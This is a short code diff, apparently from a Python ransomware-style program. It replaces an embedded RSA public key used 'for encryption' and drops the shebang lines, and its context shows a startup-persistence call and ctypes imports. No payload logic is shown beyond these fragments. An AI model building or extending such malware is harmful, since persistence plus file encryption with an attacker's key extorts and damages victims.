@@ -1,5 +1,3 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
 import base64
 import ctypes
 import hashlib
@@ -113,18 +111,18 @@ add_to_startup()
 
 # RSA PUBLIC KEY FOR ENCRYPTION
 public_key_str = """-----BEGIN PUBLIC KEY-----
-MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEArHvo2tItnqXC9sUEUknc
-3u1gbjvkt5XbAfobxHeJTdmSBFK39J7yVEJx2pSU5SSxjVO8bABCKPRo6N+1Yq8c
-2BMd9yss0vuMDUbZBf92J+hSfTJldf8EupN3UZ2ncfL4/OTVEN4AZM+5aSBsWH/1
-TtGkXzHg+kpJicXen4deS1CebwAolvDm4pqzDPNa1mnrpQx1O5NQsJDu5vCcs5qk
-ElqKsqezGQQsWVt7zTfcMwLTHZNEo+RABZFCs7aYIfS50q/LjchEyjohWCpw0mgn
-zTrFFE0YAz+Q3B0mipKAerEx+YeBkWtNTNNdQ5SWPgBQmjpDXXKnn3LT0v/rR8jq
-useA1z225e9OGCKqS6MwpC0edNRHgrrRVNhcMTSgvDAword1xDaYZepnx1PH4hv6
-1fRZERPLa6Ks+ngWkc56FbDMSsPYWdZkR6SHli0EvmH0ZE9kMiegF1s/IFEfDdqJ
-nmKiwe1aMHLjklu+gqGi9gaRhTjk9wkwvsj9WyX7PZo3/7BwpMhB44/TpE9dACIn
-Bi2O0c8dqB+uHIRnElliNtj9VTc1jeEoRDS8+VEjJ3uSkpM/ETcPUnhfmUVxquBk
-+9Iphypm0Wi5vtyH0gkZiA+VM3laPu7QfZ0LRkXHF+x5Et/S1zk8b3TF23MgkTIk
-st12IlGUgWqrJBemqqvir4MCAwEAAQ==
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAqB1H9LghnOHBaiVgJZKR
+ORs4tLZtB665+urd4eCXb6exY+xEzcmfN1NdBWXWuLiw5kh1bHjGXnKWhgQcGaCp
+JgcO+GVB0JK0KYEO8ZscTwywuBiXxT50QCxyOPHrlgrk7ZEPf9L1KFMOoh3awayW
+GlkH0mrSMm+V/jJvu177QI1iJaOU4Mmwp3fpFbIamnMxkMa51MWGVZR+nGPr92JV
+wfXftxWvpXEH0J2BL8neyBsltbO8HRjFaRIE88z61CpTC0CAO/DlFedza3B13H6z
++Dfrcx+i0F2UBjrvfthFhb4Mxh1BtX4C34s7YFxiRlES1RUJvtYn0LQojbTMgYzf
+4yESF9fhfIcK7QbLSY5OhonJb2uZaqmIDaDMtL0xCaUKmBCK8lwGnuBJcvj6c1Tx
+8enZqKuGlQydY43L9B50nR+RRgbcxAHWYY0LPTJ40iCerGh146bnIk00dKRz0O2z
+KTnG1DB/52BBf8S0gTvKhjErD6pANJtKkd5NEoRh7/wF7albQWV8LNBdJdW1e7Ka
+UU3/X1ZIzkji6r01H4LoSmRm9XLTyLI4iK8ApQXPOe7HgFge1YirgK5qJnq6HwpS
+yhjZBcl+dVROklFwkvVekdU7SabiaN+v6utQTuMSFaJ6W/hfL0Tm2sajgGy/c2zv
+4a/x9dem/AdfyTRBZ5w3eLcCAwEAAQ==
 -----END PUBLIC KEY-----"""
 public_key = bytes(public_key_str, 'utf-8')
 # with open("public_key.pem", "rb") as f:
